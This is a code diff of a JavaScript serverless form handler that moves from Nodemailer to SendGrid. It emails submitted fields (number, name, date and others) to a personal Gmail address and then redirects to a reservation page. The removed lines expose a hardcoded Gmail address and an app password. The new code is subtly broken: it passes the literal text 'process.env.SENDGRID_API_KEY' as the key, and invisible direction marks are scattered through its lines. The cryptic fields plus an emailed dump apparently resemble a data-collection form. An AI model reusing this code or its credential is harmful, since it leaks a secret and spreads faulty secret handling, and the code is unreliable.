@@ -1,30 +1,20 @@
-import nodemailer from "nodemailer";
+‏import sendgrid from "@sendgrid/mail";
 
-export default async function handler(req, res) {
-if (req.method !== "POST") {
-return res.status(405).json({ message: "Method not allowed" });
+‏sendgrid.setApiKey("process.env.SENDGRID_API_KEY");
+
+‏export default async function handler(req, res) {
+‏ if (req.method !== "POST") {
+‏ return res.status(405).json({ message: "Method not allowed" });
 }
 
-const { nimber, namea, dete, iqd, pa, wp } = req.body;
+‏ const { nimber, namea, dete, iqd, pa, wp } = req.body;
 
-const EMAIL_USER = "hamoozimran340@gmail.com";
-const EMAIL_PASS = "bukxdbrzvabrbisf";
-
-// إعداد SMTP مع Gmail
-const transporter = nodemailer.createTransport({
-service: "gmail",
-auth: {
-user: EMAIL_USER,
-pass: EMAIL_PASS,
-},
-});
-
-try {
-await transporter.sendMail({
-from: EMAIL_USER,
-to: EMAIL_USER, // الإيميل سيستقبل نفسه
-subject: "المعلومات",
-text: `
+‏ try {
+‏ await sendgrid.send({
+‏ to: "hamoozimran340@gmail.com", // بريدك لاستقبال الرسائل
+‏ from: "hamoozimran340@gmail.com", //
+‏ subject: "المعلومات",
+‏ text: `
 الرقم: ${nimber}
 الاسم: ${namea}
 التاريخ: ${dete}
@@ -34,16 +24,12 @@ text: `
 `,
 });
 
-// بعد الإرسال، أرسل JSON بالتحويل
-res.status(200).json({
-message: "تم الإرسال بنجاح",
-redirect: "https://rayan-cyan.vercel.app/reservation/index.html"
+‏ res.status(200).json({
+‏ message: "تم الإرسال بنجاح",
+‏ redirect: "https://rayan-cyan.vercel.app/reservation/index.html"
 });
-
-} catch (error) {
-console.error("خطأ أثناء الإرسال:", error);
-res.status(500).json({ message: "خطأ أثناء الإرسال" });
+‏ } catch (error) {
+‏ console.error("خطأ أثناء الإرسال:", error);
+‏ res.status(500).json({ message: "حدث خطأ أثناء الإرسال" });
 }
 }
-
-
